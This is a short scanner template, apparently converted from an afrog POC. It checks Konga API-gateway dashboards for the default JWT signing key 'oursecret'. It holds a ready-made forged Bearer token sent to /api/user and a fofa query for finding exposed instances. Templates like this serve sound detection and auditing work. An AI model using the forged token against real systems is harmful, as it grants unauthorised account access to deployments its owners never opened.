# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - headers:
      Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MQ.gSssTBEVe6X9aFEd0H_tt8kk2u7df90W1eOzNRnrsQ4
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"createdUser":'
          - '"username":'
          - '"activationToken":'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/api/user'
id: konga-default-jwt-key
info:
  author: wys
  description: |-
    The default key of Konga JWT is oursecret, which can forge arbitrary user permissions
    fofa: app="Konga-Api-Gateway"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: KONGA Arbitrary user login vulnerability
  severity: high
  tags: kong,jwt,default,argus-import
